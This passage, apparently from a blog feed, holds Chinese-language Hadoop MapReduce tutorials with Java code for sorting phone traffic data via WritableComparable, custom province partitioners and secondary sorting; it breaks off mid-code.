class="keyword">import</span> java.io.DataOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 21:40 2022/12/17</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@Setter</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlowBean</span> <span class="keyword">implements</span> <span class="title class_">WritableComparable</span>&lt;FlowBean&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> upFlow;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> downFlow;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> sumFlow;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FlowBean</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSumFlow</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.sumFlow = <span class="built_in">this</span>.upFlow + <span class="built_in">this</span>.downFlow;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(DataOutput dataOutput)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        dataOutput.writeLong(upFlow);</span><br><span class="line">        dataOutput.writeLong(downFlow);</span><br><span class="line">        dataOutput.writeLong(sumFlow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readFields</span><span class="params">(DataInput dataInput)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.upFlow = dataInput.readLong();</span><br><span class="line">        <span class="built_in">this</span>.downFlow = dataInput.readLong();</span><br><span class="line">        <span class="built_in">this</span>.sumFlow = dataInput.readLong();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> upFlow + <span class="string">&quot;\t&quot;</span> + downFlow + <span class="string">&quot;\t&quot;</span> + sumFlow;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareTo</span><span class="params">(FlowBean o)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 按照总流量比较,倒叙排列</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.sumFlow &gt; o.sumFlow) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.sumFlow &lt; o.sumFlow) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（3）Mapper-类"><a href="#（3）Mapper-类" class="headerlink" title="（3）Mapper 类"></a>（3）Mapper 类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.writableComparable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.LongWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 21:59 2022/12/17</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlowMapper</span> <span class="keyword">extends</span> <span class="title class_">Mapper</span>&lt;LongWritable, Text, FlowBean, Text&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">FlowBean</span> <span class="variable">outK</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FlowBean</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Text</span> <span class="variable">outV</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Text</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">map</span><span class="params">(LongWritable key, Text value, Mapper&lt;LongWritable, Text, FlowBean,Text &gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.获取一行数据</span></span><br><span class="line">        <span class="comment">// 13736230513 2481 24681 27162</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> value.toString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.切割数据</span></span><br><span class="line">        <span class="keyword">final</span> String[] split = line.split(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4.封装 outK outV</span></span><br><span class="line">        outK.setUpFlow(Long.parseLong(split[<span class="number">1</span>]));</span><br><span class="line">        outK.setDownFlow(Long.parseLong(split[<span class="number">2</span>]));</span><br><span class="line">        outK.setSumFlow();</span><br><span class="line">        outV.set(split[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5.写出 outK outV</span></span><br><span class="line">        context.write(outK, outV);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（4）Reducer-类"><a href="#（4）Reducer-类" class="headerlink" title="（4）Reducer 类"></a>（4）Reducer 类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.writableComparable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Reducer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 22:07 2022/12/17</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlowReducer</span> <span class="keyword">extends</span> <span class="title class_">Reducer</span>&lt;FlowBean, Text, Text, FlowBean&gt; &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">reduce</span><span class="params">(FlowBean key, Iterable&lt;Text&gt; values, Reducer&lt;FlowBean, Text, Text, FlowBean&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历values集合,循环写出,避免总流量相同的情况</span></span><br><span class="line">        <span class="keyword">for</span> (Text value : values) &#123;</span><br><span class="line">            <span class="comment">// 调换 KV 位置,反向写出</span></span><br><span class="line">            context.write(value, key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（5）驱动器类"><a href="#（5）驱动器类" class="headerlink" title="（5）驱动器类"></a>（5）驱动器类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.writableComparable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Job;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.FileInputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 22:14 2022/12/17</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlowDriver</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.获取job对象</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Job</span> <span class="variable">job</span> <span class="operator">=</span> Job.getInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.关联 driver mapper reducer</span></span><br><span class="line">        job.setJarByClass(FlowDriver.class);</span><br><span class="line">        job.setMapperClass(FlowMapper.class);</span><br><span class="line">        job.setReducerClass(FlowReducer.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.设置 map 端输出 KV 类型</span></span><br><span class="line">        job.setMapOutputKeyClass(FlowBean.class);</span><br><span class="line">        job.setMapOutputValueClass(Text.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4.设置程序最终输出 KV 类型</span></span><br><span class="line">        job.setOutputKeyClass(Text.class);</span><br><span class="line">        job.setOutputValueClass(FlowBean.class);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5.设置程序输入输出路径</span></span><br><span class="line">        FileInputFormat.setInputPaths(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\phone_data.txt&quot;</span>));</span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\output\\&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6.提交job</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span> job.waitForCompletion(<span class="literal">true</span>);</span><br><span class="line">        System.exit(b ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="五：WritableComparable-排序案例实操（区内排序）"><a href="#五：WritableComparable-排序案例实操（区内排序）" class="headerlink" title="五：WritableComparable 排序案例实操（区内排序）"></a>五：WritableComparable 排序案例实操（区内排序）</h1><h2 id="5-1-需求"><a href="#5-1-需求" class="headerlink" title="5.1 需求"></a>5.1 需求</h2><p>要求每个省份手机号输出的文件中按照总流量内部排序。</p><h2 id="5-2-需求分析"><a href="#5-2-需求分析" class="headerlink" title="5.2 需求分析"></a>5.2 需求分析</h2><p>基于前一个需求，增加自定义分区类，分区按照省份手机号设置。</p><p><img src="/blog/59213c23.html/image-20221218181040515.png"></p><h2 id="5-3-代码实现"><a href="#5-3-代码实现" class="headerlink" title="5.3 代码实现"></a>5.3 代码实现</h2><h3 id="（1）增加自定义分区类"><a href="#（1）增加自定义分区类" class="headerlink" title="（1）增加自定义分区类"></a>（1）增加自定义分区类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.writableComparableWithPartition;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Partitioner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 18:13 2022/12/18</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProvincePartitioner2</span> <span class="keyword">extends</span> <span class="title class_">Partitioner</span>&lt;FlowBean, Text&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getPartition</span><span class="params">(FlowBean flowBean, Text text, <span class="type">int</span> i)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取手机号前三位</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">phone</span> <span class="operator">=</span> text.toString();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">prePhone</span> <span class="operator">=</span> phone.substring(<span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义一个分区号变量 partition,根据 perPhone 设置分区号</span></span><br><span class="line">        <span class="type">int</span> partition;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;136&quot;</span>.equals(prePhone)) &#123;</span><br><span class="line">            partition = <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;137&quot;</span>.equals(prePhone)) &#123;</span><br><span class="line">            partition = <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;138&quot;</span>.equals(prePhone)) &#123;</span><br><span class="line">            partition = <span class="number">2</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;139&quot;</span>.equals(prePhone)) &#123;</span><br><span class="line">            partition = <span class="number">3</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            partition = <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回分区号</span></span><br><span class="line">        <span class="keyword">return</span> partition;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（2）FlowDriver-设置分区类和-Reduce-数量"><a href="#（2）FlowDriver-设置分区类和-Reduce-数量" class="headerlink" title="（2）FlowDriver  设置分区类和 Reduce 数量"></a>（2）FlowDriver  设置分区类和 Reduce 数量</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 设置自定义分区器</span></span><br><span class="line">job.setPartitionerClass(ProvincePartitioner2.class);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置对应的 ReduceTask 的个数</span></span><br><span class="line">job.setNumReduceTasks(<span class="number">5</span>);</span><br></pre></td></tr></table></figure><h2 id="5-4-二次排序"><a href="#5-4-二次排序" class="headerlink" title="5.4 二次排序"></a>5.4 二次排序</h2><ul><li><p>若想要进行区内排序的二次排序，比如对某省份手机号的总流量进行降序；若总流量相同，按照上行流量降序排列；</p></li><li><p>仅需要在FlowBean中，对 compareTo 方法进行业务逻辑的增加。</p></li><li><pre><code class="java">    @Override    public int compareTo(FlowBean o) &#123;        // 按照总流量比较,倒叙排列（降序）        if (this.sumFlow &gt; o.sumFlow) &#123;            return -1;        &#125; else if (this.sumFlow &lt; o.sumFlow) &#123;            return 1;        &#125; else &#123;            /*             * Author: Rupert-Tears             * CreateTime: 18:29 2022/12/18             * Description: 二次排序,对上行流量升序排列             */            if (this.upFlow &gt; o.upFlow) &#123;                return 1;            &#125; else if (this.upFlow &lt; o.upFlow) &#123;                return -1;            &#125; else &#123;                return 0;            &#125;        &#125;    &#125;</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MapReduce Partition分区</title>
      <link href="/blog/ee4a420a.html/"/>
      <url>/blog/ee4a420a.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：问题引出"><a href="#一：问题引出" class="headerlink" title="一：问题引出"></a>一：问题引出</h1><p>要求将统计结果按照条件输出到不同文件中（分区）。比如：将统计结果按照手机 归属地不同省份输出到不同文件中（分区）</p><h1 id="二：默认Partitioner分区"><a href="#二：默认Partitioner分区" class="headerlink" title="二：默认Partitioner分区"></a>二：默认Partitioner分区</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashPartitioner</span>&lt;K, V&gt; <span class="keyword">extends</span> <span class="title class_">Partitioner</span>&lt;K, V&gt; &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getPartition</span><span class="params">(K key, V value, <span class="type">int</span> numReduceTasks)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> (key.hashCode() &amp; Integer.MAX_VALUE) % numReduceTasks;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>默认分区是根据key的hashCode对ReduceTasks个数取模得到的。用户没法控制哪个 key存储到哪个分区。</li></ul><h1 id="三：自定义Partitioner-步骤"><a href="#三：自定义Partitioner-步骤" class="headerlink" title="三：自定义Partitioner 步骤"></a>三：自定义Partitioner 步骤</h1><h2 id="3-1-自定义类继承Partitioner，重写getPartition-方法"><a href="#3-1-自定义类继承Partitioner，重写getPartition-方法" class="headerlink" title="3.1 自定义类继承Partitioner，重写getPartition()方法"></a>3.1 自定义类继承Partitioner，重写getPartition()方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomPartitioner</span> <span class="keyword">extends</span> <span class="title class_">Partitioner</span>&lt;Text, FlowBean&gt; &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getPartition</span><span class="params">(Text key, FlowBean value, <span class="type">int</span> numPartitions)</span> &#123;</span><br><span class="line"><span class="comment">// 控制分区代码逻辑</span></span><br><span class="line">… …</span><br><span class="line"><span class="keyword">return</span> partition;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-2-在Job驱动中，设置自定义Partitioner"><a href="#3-2-在Job驱动中，设置自定义Partitioner" class="headerlink" title="3.2 在Job驱动中，设置自定义Partitioner"></a>3.2 在Job驱动中，设置自定义Partitioner</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">job.setPartitionerClass(CustomPartitioner.class);</span><br></pre></td></tr></table></figure><h2 id="3-3-自定义Partition后，要根据自定义Partitioner的逻辑设置相应数量的ReduceTask"><a href="#3-3-自定义Partition后，要根据自定义Partitioner的逻辑设置相应数量的ReduceTask" class="headerlink" title="3.3 自定义Partition后，要根据自定义Partitioner的逻辑设置相应数量的ReduceTask"></a>3.3 自定义Partition后，要根据自定义Partitioner的逻辑设置相应数量的ReduceTask</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">job.setNumReduceTasks(<span class="number">5</span>);</span><br></pre></td></tr></table></figure><h1 id="四：分区总结"><a href="#四：分区总结" class="headerlink" title="四：分区总结"></a>四：分区总结</h1><p>（1）如果ReduceTask的数量&gt; getPartition的结果数，则会多产生几个空的输出文件part-r-000xx；</p><p>（2）如果1&lt;ReduceTask的数量&lt;getPartition的结果数，则有一部分分区数据无处安放，会Exception；</p><p>（3）如 果ReduceTask的数量&#x3D;1，则不管MapTask端输出多少个分区文件，最终结果都交给这一个 ReduceTask，最终也就只会产生一个结果文件 part-r-00000；</p><p>（4）分区号必须从零开始，逐一累加。</p><h1 id="五：案例分析"><a href="#五：案例分析" class="headerlink" title="五：案例分析"></a>五：案例分析</h1><ul><li>例如：假设自定义分区数为5，则 <ul><li>（1）job.setNumReduceTasks(1); </li><li>（2）job.setNumReduceTasks(2); </li><li>（3）job.setNumReduceTasks(6); 会正常运行，只不过会产生一个输出文件 会报错 大于5，程序会正常运行，会产生空文件</li></ul></li></ul><h1 id="六：Partition-分区案例实操"><a href="#六：Partition-分区案例实操" class="headerlink" title="六：Partition 分区案例实操"></a>六：Partition 分区案例实操</h1><h2 id="6-1-需求"><a href="#6-1-需求" class="headerlink" title="6.1 需求"></a>6.1 需求</h2><p>将统计结果按照手机归属地不同省份输出到不同文件中（分区）；</p><h3 id="（1）输入数据"><a href="#（1）输入数据" class="headerlink" title="（1）输入数据"></a>（1）输入数据</h3><ul><li>phone_data .txt</li></ul><h3 id="（2）期望输出数据"><a href="#（2）期望输出数据" class="headerlink" title="（2）期望输出数据"></a>（2）期望输出数据</h3><ul><li>手机号 136、137、138、139 开头都分别放到一个独立的 4 个文件中，其他开头的放到 一个文件中。</li></ul><h2 id="6-2-需求分析"><a href="#6-2-需求分析" class="headerlink" title="6.2 需求分析"></a>6.2 需求分析</h2><p><img src="/blog/ee4a420a.html/image-20221218171052800.png"></p><h2 id="6-3-代码实现"><a href="#6-3-代码实现" class="headerlink" title="6.3 代码实现"></a>6.3 代码实现</h2><h3 id="（1）增加分区类"><a href="#（1）增加分区类" class="headerlink" title="（1）增加分区类"></a>（1）增加分区类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.partition;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Partitioner;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 17:17 2022/12/18</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProvincePartitioner</span> <span class="keyword">extends</span> <span class="title class_">Partitioner</span>&lt;Text, FlowBean&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getPartition</span><span class="params">(Text text, FlowBean flowBean, <span class="type">int</span> i)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取手机号前三位 prePhone</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">phone</span> <span class="operator">=</span> text.toString();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">prePhone</span> <span class="operator">=</span> phone.substring(<span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 定义一个分区号变量partition,根据prePhone设置分区号</span></span><br><span class="line">        <span class="type">int</span> partition;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (prePhone) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;136&quot;</span>:</span><br><span class="line">                partition = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;137&quot;</span>:</span><br><span class="line">                partition = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;138&quot;</span>:</span><br><span class="line">                partition = <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;139&quot;</span>:</span><br><span class="line">                partition = <span class="number">3</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                partition = <span 